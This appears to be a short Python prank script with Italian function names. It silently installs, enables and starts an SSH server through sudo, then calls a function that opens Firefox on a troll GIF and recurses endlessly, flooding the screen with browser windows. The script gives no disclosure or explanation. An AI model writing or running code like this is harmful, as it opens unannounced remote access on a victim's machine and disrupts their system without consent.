import os 
import subprocess as sp

def funzione():
    os.system('firefox https://c.tenor.com/9ehaLIQklcMAAAAC/letroll.gif')
    funzione()

def ssh():
  sp.run(['sudo', 'apt-get', 'install', 'openssh-server'])
  sp.run(['sudo', 'systemctl', 'enable', 'ssh'])
  sp.run(['sudo', 'systemctl', 'start', 'ssh'])

ssh()
funzione()
